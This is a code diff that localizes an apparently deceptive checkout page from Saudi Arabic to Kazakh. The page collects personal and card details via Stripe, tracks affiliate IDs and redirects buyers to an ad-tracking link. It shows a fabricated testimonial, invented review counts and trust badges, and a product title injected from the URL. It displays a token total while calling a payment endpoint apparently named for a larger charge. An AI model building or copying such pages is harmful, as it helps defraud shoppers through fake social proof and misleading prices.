@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="kk">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>الدفع الآمن</title>
+  <title>Қауіпсіз төлем</title>
   <meta name="referrer" content="no-referrer">
 
   <!-- Google tag -->
@@ -23,7 +23,7 @@
     html,body{height:100%}
     body{
       margin:0;background:var(--bg);color:var(--text);
-      font-family:Tajawal,Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+      font-family:Inter,system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
     }
 
     .wrap{max-width:1100px;margin:0 auto;padding:18px 14px 60px}
@@ -55,9 +55,6 @@
       width:100%;padding:12px;border:none;border-radius:12px;
       background:#16a34a;color:#fff;font-weight:900;cursor:pointer
     }
-
-    .logos{display:flex;gap:10px;margin-top:12px}
-    .logos img{height:20px}
 
     .err{
       display:none;background:#fff1f1;border:1px solid #f5bcbc;
@@ -143,12 +140,42 @@
 
 <body>
 
-<div class="safe">دفع آمن بتقنية SSL</div>
+<script>
+  sessionStorage.setItem("orig_qs", location.search.replace(/^\?/, ""));
+</script>
+
+<!-- GoAffPro tracking -->
+<script>
+(function(){
+  const qs = new URLSearchParams(location.search);
+  const keys = ["sub_id","subid","aff_sub","aff_sub4","click_id","cid","tid"];
+  for (const k of keys){
+    const v = qs.get(k);
+    if (v){
+      localStorage.setItem("aff_sub_id", v);
+      document.cookie = "aff_sub_id=" + v + "; path=/";
+    }
+  }
+})();
+(function(){
+  const qs = new URLSearchParams(location.search);
+  const ref =
+    qs.get("ref") ||
+    localStorage.getItem("gaf_ref") ||
+    (document.cookie.match(/gaf_ref=([^;]+)/)||[])[1];
+  if (ref){
+    localStorage.setItem("gaf_ref", ref);
+    document.cookie = "gaf_ref=" + ref + "; path=/";
+  }
+})();
+</script>
+
+<div class="safe">SSL арқылы қауіпсіз төлем</div>
 
 <div class="wrap">
   <div class="page-title">
-    الدفع الآمن 🔒 <span class="stars">★★★★★</span>
-    <span class="reviews">(2777 تقييم)</span>
+    Қауіпсіз төлем 🔒 <span class="stars">★★★★★</span>
+    <span class="reviews">(2777 пікір)</span>
   </div>
 
   <div class="grid">
@@ -161,42 +188,42 @@
           <img id="heroImg" alt="">
           <div>
             <div id="heroTitle" style="font-weight:900;font-size:14px"></div>
-            <div class="sub">المنتج من الرابط الخاص بك</div>
+            <div class="sub">Сіздің сілтемедегі өнім</div>
           </div>
         </div>
 
-        <div class="h2">1. المعلومات</div>
+        <div class="h2">1. Ақпарат</div>
 
         <div class="form-grid">
-          <input id="firstName" class="input" placeholder="الاسم الأول">
-          <input id="lastName" class="input" placeholder="اسم العائلة">
+          <input id="firstName" class="input" placeholder="Аты">
+          <input id="lastName" class="input" placeholder="Тегі">
         </div>
 
         <div class="form-grid">
-          <input id="billingStreet" class="input" placeholder="العنوان" style="grid-column:1/-1">
-          <input id="billingPostcode" class="input" placeholder="الرمز البريدي">
-          <input id="billingCity" class="input" placeholder="المدينة">
+          <input id="billingStreet" class="input" placeholder="Мекенжай" style="grid-column:1/-1">
+          <input id="billingPostcode" class="input" placeholder="Пошта индексі">
+          <input id="billingCity" class="input" placeholder="Қала">
         </div>
 
         <div class="form-grid">
-          <input id="emailInput" class="input" type="email" placeholder="البريد الإلكتروني">
-          <input class="input" value="المملكة العربية السعودية" disabled>
+          <input id="emailInput" class="input" type="email" placeholder="Электрондық пошта">
+          <input class="input" value="Қазақстан" disabled>
         </div>
 
         <div class="form-grid">
           <select id="phonePrefix" class="select">
-            <option value="+966">+966 — السعودية</option>
+            <option value="+7">+7 — Қазақстан</option>
           </select>
-          <input id="phoneNumber" class="input" placeholder="رقم الهاتف">
+          <input id="phoneNumber" class="input" placeholder="Телефон нөмірі">
         </div>
 
         <input id="nameInput" type="hidden">
-        <button id="nextBtn" class="btn">متابعة</button>
+        <button id="nextBtn" class="btn">Жалғастыру</button>
       </section>
 
       <section id="step2" class="step" aria-hidden="true">
-        <div class="h2">2. الدفع</div>
-        <p class="sub">يتم تشفير بيانات البطاقة ومعالجتها بواسطة Stripe.</p>
+        <div class="h2">2. Төлем</div>
+        <p class="sub">Карта деректері шифрланып, Stripe арқылы өңделеді.</p>
 
         <div>
           <div id="card-number" class="el"></div>
@@ -209,43 +236,45 @@
         <div id="err" class="err" aria-hidden="true"></div>
 
         <div style="display:flex;gap:10px;margin-top:12px">
-          <button id="backBtn" class="btn" style="width:40%">رجوع</button>
-          <button id="payNow" class="btn" style="width:60%">ادفع بأمان</button>
+          <button id="backBtn" class="btn" style="width:40%">Артқа</button>
+          <button id="payNow" class="btn" style="width:60%">Қауіпсіз төлеу</button>
         </div>
       </section>
 
     </div>
 
     <aside>
+
       <div class="widget">
-        <div style="text-align:center;font-weight:800">آراء عملائنا</div>
+        <div style="text-align:center;font-weight:800">Клиент пікірлері</div>
         <div style="text-align:center;font-weight:700;">Fenella Lara</div>
         <div style="text-align:center;color:#f6b80c;">★★★★★</div>
-        <p style="text-align:center">استلمت طلبي بالأمس. تجربة رائعة!</p>
+        <p style="text-align:center">Өнімді кеше алдым. Өте жақсы!</p>
       </div>
 
       <div class="widget">
         <div class="delivery">
           <img id="sidebarImg" style="width:52px;height:52px;border-radius:8px;border:1px solid var(--line);display:none">
           <div>
-            <div style="font-weight:800">توصيل سريع</div>
-            <div class="sub">3–5 أيام عمل</div>
+            <div style="font-weight:800">Жылдам жеткізу</div>
+            <div class="sub">3–5 жұмыс күні</div>
           </div>
-          <div style="margin-left:auto;font-weight:800">مجاني</div>
+          <div style="margin-left:auto;font-weight:800">Тегін</div>
         </div>
 
-        <div style="margin-top:14px;font-weight:800">ملخص الطلب</div>
-        <div class="order-row"><span>الإجمالي</span><span>2 ر.س</span></div>
+        <div style="margin-top:14px;font-weight:800">Тапсырыс қорытындысы</div>
+        <div class="order-row"><span>Барлығы</span><span>4 500 ₸</span></div>
       </div>
 
       <div class="widget">
-        <div style="font-weight:800;margin-bottom:10px">لماذا يمكنك الوثوق بنا</div>
+        <div style="font-weight:800;margin-bottom:10px">Неліктен бізге сенуге болады</div>
         <div class="trust">
-          <div class="box"><div>⭐</div><div>99% تقييمات إيجابية</div></div>
-          <div class="box"><div>🔒</div><div>حماية SSL</div></div>
-          <div class="box"><div>🛡️</div><div>937,500 ر.س</div></div>
+          <div class="box"><div>⭐</div><div>99% оң пікір</div></div>
+          <div class="box"><div>🔒</div><div>SSL қорғаныс</div></div>
+          <div class="box"><div>🛡️</div><div>112 500 000 ₸</div></div>
         </div>
       </div>
+
     </aside>
 
   </div>
@@ -253,9 +282,9 @@
 
 <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
   <div class="loading-box">
-    <div class="loading-title">جارٍ معالجة الدفع…</div>
+    <div class="loading-title">Төлем өңделуде…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
-    <p class="sub" style="margin-top:10px">يرجى الانتظار، قد يستغرق ذلك بضع ثوانٍ…</p>
+    <p class="sub" style="margin-top:10px">Бірнеше секунд күтіңіз…</p>
   </div>
 </div>
 
@@ -270,7 +299,6 @@ window.addEventListener('DOMContentLoaded', () => {
     const sop1 = qs.get('sub1');
     if (sop1){
       const title = decodeURIComponent(sop1);
-
       const pt = document.querySelector('.page-title');
       if (pt){
         for (const n of pt.childNodes){
@@ -280,7 +308,6 @@ window.addEventListener('DOMContentLoaded', () => {
           }
         }
       }
-
       const d = document.querySelector('.delivery div div');
       if (d) d.textContent = title;
     }
@@ -342,7 +369,7 @@ window.addEventListener('DOMContentLoaded', () => {
         line1: billingStreet.value,
         city: billingCity.value,
         postal_code: billingPostcode.value,
-        country: "SA"
+        country: "KZ"
       }
     };
 
@@ -354,7 +381,7 @@ window.addEventListener('DOMContentLoaded', () => {
       });
       if (pm.error) throw pm.error;
 
-      const r = await fetch("/api/stripe/one-time-33-95",{
+      const r = await fetch("/api/stripe/one-time-28-95",{
         method:"POST",
         headers:{ "Content-Type":"application/json" },
         body:JSON.stringify({
@@ -373,7 +400,7 @@ window.addEventListener('DOMContentLoaded', () => {
         throw new Error('Payment not completed');
 
       window.location.href =
-        "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
+        "https://cudsr.bemobtrcks.com/go/6b6e67d8-fe22-4816-8318-ef7cf7685f83";
 
     } catch(e){
       err.textContent = e.message;
